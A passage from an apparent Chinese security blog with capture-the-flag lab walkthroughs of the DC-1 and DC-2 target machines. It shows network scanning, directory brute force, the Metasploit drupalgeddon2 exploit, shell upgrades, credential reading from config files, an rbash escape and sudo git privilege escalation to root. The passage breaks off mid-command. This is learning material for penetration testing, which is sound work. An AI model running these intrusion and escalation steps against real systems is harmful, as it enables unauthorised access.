环境变量通常只包含一些基本的命令，例如 ls, cat, echo 等。</li></ul></li><li>RBASH 的目的是为了提高系统的安全性，防止用户执行一些危险或不合法的操作。</li></ul></blockquote><p>学习文档：<a href="https://www.freebuf.com/vuls/376922.html%EF%BC%88Linux%E6%8F%90%E6%9D%83%E4%B9%8Brbash%E7%BB%95%E8%BF%87%EF%BC%89">https://www.freebuf.com/vuls/376922.html（Linux提权之rbash绕过）</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> -p   // 查看环境变量<br><br>BASH_CMDS[a]=/bin/sh;a  // 把/bin/sh;a这个值赋值给目标数组位置<br><br>执行 /bin/bash 命令 // 退出返回当前普通tom用户<br><br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/bin  // 添加环境变量<br><br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/usr/bin // 添加环境变量<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629211244365.png" alt="image-20240629211244365"></p><p>添加完环境变量后，<code>ls</code>查看当前目录内容，<code>compgen -c</code>查看当前支持的指令。</p><p>结果显示出了绕过之前<code>compgen -c</code>所没有的很多命令，说明rbash绕过成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629212249196.png" alt="image-20240629212249196"></p><p>尝试<code>sudo su</code>提权，但结果还是没能成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629212501959.png" alt="image-20240629212501959"></p><p>因此需要继续提权。再仔细查看绕过后系统允许的命令，发现有<code>find</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629212610412.png" alt="image-20240629212610412"></p><p>我们上一个靶场利用<code>find</code>命令成功进行了提权，那这次也一样捏！</p><p>首先利用find命令，查看具有SUID权限的可执行二进制文件（命令）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629212859976.png" alt="image-20240629212859976"></p><p>发现好像没啥文件可利用。而上一个靶场中<code>find</code>命令也具有SUID权限。</p><p>尝试切换用户！切换到 jerry账户 ！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">su &lt;用户名jerry&gt;  // 然后输入jerry的密码即可<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629214309315.png" alt="image-20240629214309315"></p><p><code>sudo -l</code>查看sudo的配置文件</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629214442931.png" alt="image-20240629214442931"></p><p>可以得到的信息是，<code> (root) NOPASSWD: /usr/bin/git</code>git命令是root权限的。</p><p><strong>git命令可以实现提权</strong></p><blockquote><p>方法一：</p><p>sudo git help config</p><p>!&#x2F;bin&#x2F;bash 或 !’sh’</p><p>方法二：</p><p>sudo git -p help</p><p>!&#x2F;bin&#x2F;bash </p></blockquote><p>首先先再用户命令行界面输入 <code>sudo git help config</code>，然后他会跳转到一个文件处，什么都不用管，直接复制<code>!/bin/bash 或 !&#39;sh&#39;</code>然后回车。</p><p>可以发现，现在已经是root用户了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629220012985.png" alt="image-20240629220012985"></p><p>但是执行<code>ls</code>的时候可以发现，当前目录下仍然只有 flag3 这个文件。根据命令行显示提示，我们是在root下的 &#x2F;home&#x2F;tom目录 执行的 ls 命令。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629215624770.png" alt="image-20240629215624770"></p><p>执行两次 <code>cd ..</code>退回到 root 根目录。然后再执行一次 ls命令，可以得到<code> final-flag.txt</code>文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> final-flag.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629220312912.png" alt="image-20240629220312912"></p><p>提权成功！</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><p>第一步工作就是确认目标靶机的IP地址。通过开关靶机或者nmap扫描实现</p></li><li><p>第二步工作就是进行端口扫描，扫描开放端口，试图从中获取一些有用的信息</p></li><li><p>第三步工作就是尝试进行目录爆破。到这一步为止的步骤和dc-1的步骤类似</p></li><li><p>通过<strong>指纹工具</strong>识别出网站使用的框架是<strong>wordpress</strong>，这类框架的漏洞常可以使用<strong>wpscan</strong>进行扫描。使用<strong>wpscan</strong>进行用户名信息扫描。</p></li><li><p>根据<strong>flag提示</strong>得知可以使用<strong>cewl</strong> ，使用其可以针对特定域名（URL）进行密码爆破字典生成。</p></li><li><p>有了<strong>密码字典</strong>以及<strong>用户名信息</strong>之后使用<strong>wpscan</strong>进行有效用户账户的爆破。</p></li><li><p>通过SSH连接来<strong>Getshell</strong>。通过利用可以使用的命令来进行提权，当仍有命令限制的时候，无法获取root权限的时候尝试使用<strong>rbash绕过</strong>来进行提权。</p></li><li><p>切换用户，查看sudo配置信息，试图获取有用信息，<strong>利用命令进行提权</strong>。最后进入root目录查看文件获取最后一个flag。</p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-1</title>
    <link href="/2024/07/24/DC-1/"/>
    <url>/2024/07/24/DC-1/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a><strong>DC-1</strong></h1><p>首先，需要让kali与靶机出于同一个网段，需要将二者都设置成桥接模式（NAT模式），这样kali在进行地址扫描的时候才能够扫除靶机的IP。</p><h2 id="靶机IP地址确认"><a href="#靶机IP地址确认" class="headerlink" title="靶机IP地址确认"></a>靶机IP地址确认</h2><p><strong>（1）可以直接通过vmvare查看DC-1靶机的MAC地址（00:0C:29:E5:19:3C）</strong></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721909942087.png" alt="img"></p><p>在kali中进行地址段扫描：（nmap扫描法）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sN 192.168.204.0/24<br></code></pre></td></tr></table></figure><p>扫描得到的结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910134252.png" alt="img"></p><p>对比mac地址，得到了靶机的IP地址。其他的地址扫描方法以及得到的效果如下：<br>p1：（arp-scan扫描）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo arp-scan -l<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910168155.png" alt="img"></p><p>p2：（netdiscover扫描 – 速度很慢）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo netdiscover<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910333640.png" alt="img"></p><p><strong>（2） 也可以通过开关靶机扫描来确定靶机的IP地址</strong> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN 192.168.204.0/24<br></code></pre></td></tr></table></figure><p> 关闭靶机时，扫描得到的结果：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910370512.png" alt="img"></p><p>打开（或挂起）靶机时，扫描得到的结果：</p><p>会发现多了一个IP地址。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910301109.png" alt="img"></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><strong>（1）扫描目标靶机IP的开放端口</strong></p><p><code>-sV</code> ：对端口上的服务程序进行扫描，扫描提供服务的版本。</p><p><code>-p </code>： 指定扫描端口，<code>-p- </code>指的是从1到65535端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV -p- 192.168.204.129<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910497135.png" alt="img"></p><p><code>-sT</code>：TCP连接扫描，不安全，速度较慢，但相对准确。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -p- 192.168.204.129<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910518883.png" alt="img"></p><p>根据结果可以看到，开放的端口有<code>22、80、111、51393</code></p><p><strong>（2）扫描开放端口的具体信息</strong></p><p><code>-sT</code> ：TCP连接扫描，不安全，速度较慢，但相对准确</p><p><code>-sV</code> ： 对端口上的服务程序进行扫描，扫描提供服务的版本</p><p><code>-sC</code> ：表示使用默认的脚本进行扫描</p><p><code>-O</code> ：扫描操作系统的版本</p><p><code>-p </code>： 指定扫描端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 22,80,111,51393 192.168.204.129<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910561368.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910577299.png" alt="img"></p><p>通过80端口呈现出来的信息可以知道，它是一个Drupal网站。</p><p>什么是Drupal呢？通过网上查询，可以知道：</p><table><thead><tr><th align="left">Drupal是一个开源的CMS框架，是一个基于LAMP技术栈的CMS框架，它允许通过安装和卸载模块的方式添加和移除功能。CMS（内容管理系统）是一种软件，允许用户使用各种智能产品中的web浏览器访问网站，添加、发布、编辑和删除内容。</th></tr></thead></table><p>通过<code>searchsploit</code>命令搜索，可以查找到CMS框架的漏洞。</p><table><thead><tr><th align="left">searchsploit是一个用于Exploit-DB的命令行搜索工具。许多漏洞都包含了二进制文件的链接，这些文件不包含在存储库中，但可以在Exploit-DB二进制文件中找到。</th></tr></thead></table><p>输入命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit drupal cms<br>searchsploit drupal<br></code></pre></td></tr></table></figure><p>得到如下扫描结果：</p><p>可以看到这类cms框架的漏洞不少。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910624007.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910639657.png" alt="img"></p><p>使用浏览器访问靶机IP，显示为一个Drupal网页：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910712860.png" alt="img"></p><p>再次查看扫描得到的端口信息，可以得知80端口服务器下的文件目录，其中有一个<code>install.php</code>的文件，选择它的原因呢，命名是install，下载文件，如果可以自己重新下载一个，并修改其中的参数，也许下载得到的效果就不一样了（&#x2F;doge）。</p><p>使用浏览器访问该文件，在上述网站网址后面加上<code>/install.php</code>。如下，可以看到一些信息，比如第二个提示”若想下载一个不同的数据库，需要在sites文件夹中适当编辑setting.php文件”</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910769368.png" alt="img"></p><h2 id="扫描常见UDP端口"><a href="#扫描常见UDP端口" class="headerlink" title="扫描常见UDP端口"></a>扫描常见UDP端口</h2><p><code>--top-ports  n</code>   ： 扫描最常用的n个端口。</p><p>对靶机IP地址进行扫描，扫描其中最常见的20个UDP端口，查看其开放状态，保存信息备用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -sU --top-ports 20 192.168.204.129<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721910815582.png" alt="img"></p><h2 id="nmap漏扫"><a href="#nmap漏扫" class="headerlink" title="nmap漏扫"></a>nmap漏扫</h2><p>对靶机进行nmap漏扫：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -script=vuln -p 22,80,111,51393 192.168.204.129<br></code></pre></td></tr></table></figure><blockquote><p>nmap -script&#x3D;vuln -p 是使用Nmap运行漏洞脚本扫描的命令。</p><p>其中“-script&#x3D;vuln”告知nmap要运行漏洞脚本扫描</p></blockquote><p>扫描结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911011291.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911032733.png" alt="img"></p><p>首先会显示目标主机的IP地址（nmap scan report for targetIP）</p><p>然后会显示扫描过程中检测到的开放的端口号（port    state    service）</p><p>下一个项目就是显示漏洞的检测结果，对于每个开放的端口，显示是否发现了与该端口相关的已知漏洞。如上图扫描结果，关于80端口的漏洞不少。</p><h2 id="gobuster目录爆破"><a href="#gobuster目录爆破" class="headerlink" title="gobuster目录爆破"></a>gobuster目录爆破</h2><table><thead><tr><th align="left">gobuster是一个用于在网站目录或者文件中进行快速且有效的字典攻击工具。它可以帮助发现目标网站中隐藏的路径。执行的功能有：目录扫描、子域名扫描、文件扩展名扫描、多线程支持、结果报告。多用于渗透测试和安全审计中。</th></tr></thead></table><p>执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.204.129 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p><code>-u</code>：指明待输入的待扫描的网站</p><p><code>-w</code>：指明字典文件的路径</p><p><code>dir</code>：表示使用目录&#x2F;文件枚举模式</p><p>鉴定为：爆破过程太久了啊<del>，不如直接利用漏洞</del></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911162748.png"></p><p><strong>gobuster常使用的命令和标志：</strong></p><ul><li><p>命令（模式）</p><p><strong>completion</strong>：为指定的shell生成自动完成脚本<br><strong>dir</strong>：使用目录&#x2F;文件枚举模式<br><strong>dns</strong>：使用DNS子域枚举模式<br><strong>fuzz</strong>：使用模糊测试模式。替换URL、Headers和请求体中的关键词FUZZ<br><strong>gcs</strong>：使用gcs bucket枚举模式<br><strong>help</strong>：获取任何命令的帮助信息<br><strong>s3</strong>：使用aws bucket枚举模式<br><strong>tftp</strong>：使用TFTP枚举模式<br><strong>version</strong>：显示当前版本<br><strong>vhost</strong>：使用VHOST枚举模式（您很可能想在URL参数中使用IP地址）</p></li><li><p>标志（全局参数）</p><p><strong>–debug</strong>：启用调试输出<br><strong>–delay duration</strong>：每个线程在请求之间的等待时间（例如1500ms）<br><strong>-h, –help</strong>：获取gobuster的帮助信息<br><strong>–no-color</strong>：禁用彩色输出<br><strong>–no-error</strong>：不显示错误<br><strong>-z, –no-progress</strong>：不显示进度<br><strong>-o, –output string</strong>：写入结果的输出文件（默认为stdout）<br><strong>-p, –pattern string</strong>：包含替换模式的文件<br><strong>-q, –quiet</strong>：不打印横幅和其他无关信息<br><strong>-t, –threads int</strong>：并发线程的数量（默认为10）<br><strong>-v, –verbose</strong>：详细输出（错误）<br><strong>-w, –wordlist string</strong>：指向字典文件的路径。设置为-以使用STDIN。<br><strong>–wordlist-offset int</strong>：从字典文件中的指定位置恢复（默认为0）<br>（原文链接：<a href="https://blog.csdn.net/weixin_70137901/article/details/134613324%EF%BC%89">https://blog.csdn.net/weixin_70137901/article/details/134613324）</a></p></li><li><p>gobuster使用基本语法</p><p><strong>目录扫描：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -w 选择一个字典 -u 输入要扫描的网站 -x 扫描的文件类型 -t 线程数量<br></code></pre></td></tr></table></figure><p><strong>子域名扫描：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster dns -d 域名 -w 字典<br></code></pre></td></tr></table></figure></li></ul><h2 id="Drupal-CMS漏洞查找"><a href="#Drupal-CMS漏洞查找" class="headerlink" title="Drupal CMS漏洞查找"></a>Drupal CMS漏洞查找</h2><p>使用Metasploit查询该CMS漏洞并进行测试。</p><table><thead><tr><th align="left">Metasploit是一款开源渗透测试框架，可以进行信息收集、漏洞扫描、漏洞利用和后渗透攻击。提供了Payload生成器用于生成各种类型的恶意代码，如shellcode、Trojan程序等。还可以通过编写脚本自动化渗透测试过程。</th></tr></thead></table><p>首先打开工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">输入命令：msfconsole<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911217520.png" alt="img"></p><p>输入命令查找Drupal CMS漏洞：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">search Drupal<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911246290.png" alt="img"></p><p>根据查询结果，可以得知这个Drupal CMS框架还是有蛮多漏洞的。Rank表示漏洞等级。此处利用漏洞等级较高且时间最新的2018年的漏洞。</p><blockquote><p> exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2 </p></blockquote><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/unix/webapp/drupal_drupalgeddon2<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911328575.png" alt="img"></p><p>查看该漏洞模块的参数：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911347750.png" alt="img"></p><p>其中，<code>Current Setting </code>是目前设置的内容，<code>Required</code>表示是否需要设置内容，yes为必须，no为可选。</p><p>然后可以看到有一个<code>RHOSTS</code>项目，重置HOST，设置为必须设置。因而接下来需要设置RHOSTS的内容，即攻击目标IP地址。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> RHOSTS 192.168.204.129<br></code></pre></td></tr></table></figure><p>然后再查看一下模块的参数，确认设置完成：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911382479.png" alt="img"></p><p>然后执行run&#x2F;exploit命令开始攻击：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run/exploit<br></code></pre></td></tr></table></figure><p>出现如下提示信息表明攻击成功！</p><p><code>Meterpreter session 1 opened </code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911445441.png" alt="img"></p><h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p>利用漏洞攻击目标主机成功之后就可以Getshell获取权限了。</p><h3 id="1、获取普通shell"><a href="#1、获取普通shell" class="headerlink" title="1、获取普通shell"></a>1、获取普通shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">shell<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911471937.png" alt="img"></p><p>然后在上述光标处输入并执行ls命令，获取目标目录下的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911485786.png" alt="img"></p><p>通过执行命令可以判断所得到的权限级别：</p><blockquote><p>一般来说，对于用户类型的ID分配为：</p><p>①系统管理员id&#x3D;0；②普通用户id&#x3D;1~65535。</p><p>而且当所获取的权限为系统管理员权限时，执行 <code>whoami</code>显示的用户名是root。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">id</span><br><br><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911507274.png" alt="img"></p><p>显然，这里获取的权限是普通用户的权限。尽管只是普通权限， 但我们仍可以通过这些普通权限去获取别的信息。</p><p>- </p><p><strong>使用命令测试是否提权成功，就是切换用户到靶机用户，得到如下效果：</strong></p><p><strong>Pay：这个操作是必要的，不然会导致提权被迫失败。</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">// 利用python的‘pty’模块来生成一个交互式的bash shell<br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911524939.png" alt="img"></p><p>- </p><p>比如，使用cat命令看看flag1.txt文件（上述执行ls获得的目录列表文件之一）的文件内容是什么：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911585897.png" alt="img"></p><p>继而搜索其他flag文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name flag*<br></code></pre></td></tr></table></figure><p>结果显示只有flag1.txt了捏：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911600169.png" alt="img"></p><p>下一步要干什么呢？通过网路查询Drupal CMS的配置文件一般叫什么，以它为切入口。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911651067.png" alt="img"></p><p>经过查询得知，Drupal的配置文件一般叫settings.php，因而找出所有<code>*settings.php</code>文件出来。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *settings.php<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911693543.png" alt="img"></p><p>一共找到了三个捏。根据文件名，第一个文件大概率是主题相关的，可以先查看后面两个文件。</p><blockquote><p>&#x2F;var&#x2F;www&#x2F;themes&#x2F;garland&#x2F;theme-settings.php<br>&#x2F;var&#x2F;www&#x2F;sites&#x2F;default&#x2F;settings.php<br>&#x2F;var&#x2F;www&#x2F;sites&#x2F;default&#x2F;default.settings.php</p></blockquote><p>先查看第二个文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/www/sites/default/settings.php<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911742361.png" alt="img"></p><p>直接就得到了数据库的相关信息，包括用户名和密码等。与此同时也得到了flag2的相关提示信息。</p><p>继续查看第三个文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /var/www/sites/default/default.settings.php<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911885892.png" alt="img"></p><p>多为注释，没啥实质性有用的信息。</p><p>根据第二个文件获取到的数据库相关信息，尝试登陆数据库，查看其中的数据。并尝试获取登陆的<code>用户名</code>和<code>密码</code>：</p><p>- </p><p>使用MYSQL命令之前需要先确保它的服务已经开启，并且已经启动。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">systemctl status mysql    // 检查状态<br>systemctl start mysql     // 启动服务<br></code></pre></td></tr></table></figure><p>未开启服务的时候返回的响应信息如果指向的是MariaDB服务未启动。</p><p>使用命令设置MariaDB自启动：（系统下次启动时就会自动启动它）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo systemctl <span class="hljs-built_in">enable</span> mariadb<br></code></pre></td></tr></table></figure><p>- </p><p>尝试执行数据库登陆命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql -udbuser -pR0ck3t<br></code></pre></td></tr></table></figure><p>用户名是<code>dbuser</code></p><p>密码是<code>R0ck3t</code></p><p>返回响应信息如下，表示成功登陆了数据库：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721911929825.png" alt="img"></p><p>查看数据库的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">show databases;<br>（分号是必须要加的）<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912100696.png" alt="img"></p><p>有两个数据库，一个是记录当前数据库系统中所有元数据的记录文件，另一个是drupaldb数据库。</p><p>接下来查看数据库中的表名：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use drupaldb;<br><br>show tables;<br><br></code></pre></td></tr></table></figure><p>注意，分号也是需要的哦。</p><p>得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912152617.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912172891.png" alt="img"></p><p>根据表名，我们可以发现数据库中含有一个表名为<code>user</code>的表，里面应该会有一些信息。</p><p>接下来查看该表的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span>;<br></code></pre></td></tr></table></figure><p>得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912205136.png" alt="img"></p><p>其中的name应该表示的是用户名，pass表示的是对应的密码。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912238522.png" alt="img"></p><p>但是细看pass，都是经过加密保护的数据：</p><blockquote><p>数据库中的密码一般采用的是hash加密。因此关于数据库加密密码的破解可以通过一些hash加密脚本进行切入。</p></blockquote><p>输入命令：（需要先退出，切换为交互界面哦~）</p><p>退出后的切换命令：<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *<span class="hljs-built_in">hash</span>*<br></code></pre></td></tr></table></figure><p>查询得到的结果很多：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721912450355.png" alt="img"></p><p>通过查看文件命名，可以发现存在一个名为：<code>password-hash.sh</code>的文件，初步判断其应该是我们要找的hash加密脚本。读取该脚本寻找其使用方法。</p><blockquote><p>.sh后缀的文件一般是shell脚本文件。用于在linux系统中执行一些自动化任务或者命令序列。</p></blockquote><p>读取加密脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> 